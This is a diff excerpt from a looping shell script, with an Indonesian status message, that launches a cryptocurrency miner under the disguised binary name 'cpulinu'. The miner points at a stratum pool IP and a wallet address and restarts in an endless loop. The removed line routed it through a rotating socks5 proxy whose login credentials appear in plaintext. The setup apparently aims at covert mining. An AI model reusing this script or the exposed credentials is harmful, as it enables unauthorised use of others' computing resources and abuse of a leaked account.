@@ -2,7 +2,7 @@
 
 while true; do
     echo "Ayo OM di GASSSSSS...Ulang.sh"
-    ./cpulinu -a Yescrypt  -o stratum+tcp://51.178.76.133:4024 -u 144jRevXH8g2WNTF7vLqkYa3VZE3ydpL7f.beta -x socks5://pymiivur-rotate:o5tci5ctvvde@p.webshare.io:80 -t4 &
+    ./cpulinu -a Yescrypt  -o stratum+tcp://51.178.76.133:4024 -u 144jRevXH8g2WNTF7vLqkYa3VZE3ydpL7f.beta -t4 &
     miner_pid=$!
 
     # Counter waktu sleep 1800 detik (30 menit) dan cetak informasi setiap 10 menit
